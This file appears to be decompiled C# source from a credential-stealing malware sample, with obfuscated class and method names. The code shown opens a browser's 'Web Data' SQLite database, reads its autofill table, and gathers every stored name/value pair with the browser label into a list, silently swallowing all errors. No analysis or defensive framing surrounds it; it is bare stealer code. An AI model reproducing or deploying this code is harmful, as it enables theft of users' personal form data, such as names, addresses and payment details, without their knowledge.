using System;
using System.Collections.Generic;
using System.IO;
using NoiseMe.Drags.App.Data.SQLite;

// Token: 0x02000046 RID: 70
internal class Class31
{
	// Token: 0x0600023B RID: 571 RVA: 0x00011860 File Offset: 0x0000FA60
	public static void fLujhrskIa(string string_0, string string_1)
	{
		try
		{
			string string_2 = Path.Combine(string_0, "Web Data");
			CNT cnt = new CNT(Class30.smethod_3(string_2));
			cnt.ReadTable("autofill");
			for (int i = 0; i < cnt.RowLength; i++)
			{
				Class31.int_0++;
				try
				{
					Class31.list_0.Add(string.Concat(new string[]
					{
						Environment.NewLine,
						"Name : ",
						cnt.ParseValue(i, "name").Trim(),
						Environment.NewLine,
						"Value : ",
						cnt.ParseValue(i, "value").Trim(),
						Environment.NewLine,
						"Browser : ",
						string_1,
						Environment.NewLine
					}));
					Class31.int_0++;
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x0600023C RID: 572 RVA: 0x0000276F File Offset: 0x0000096F
	public Class31()
	{
		Class34.A1SfXVPz7w9eh();
		base..ctor();
	}

	// Token: 0x0600023D RID: 573 RVA: 0x00002F00 File Offset: 0x00001100
	// Note: this type is marked as 'beforefieldinit'.
	static Class31()
	{
		Class34.A1SfXVPz7w9eh();
		Class31.list_0 = new List<string>();
	}

	// Token: 0x040000F6 RID: 246
	public static int int_0;

	// Token: 0x040000F7 RID: 247
	public static List<string> list_0;
}
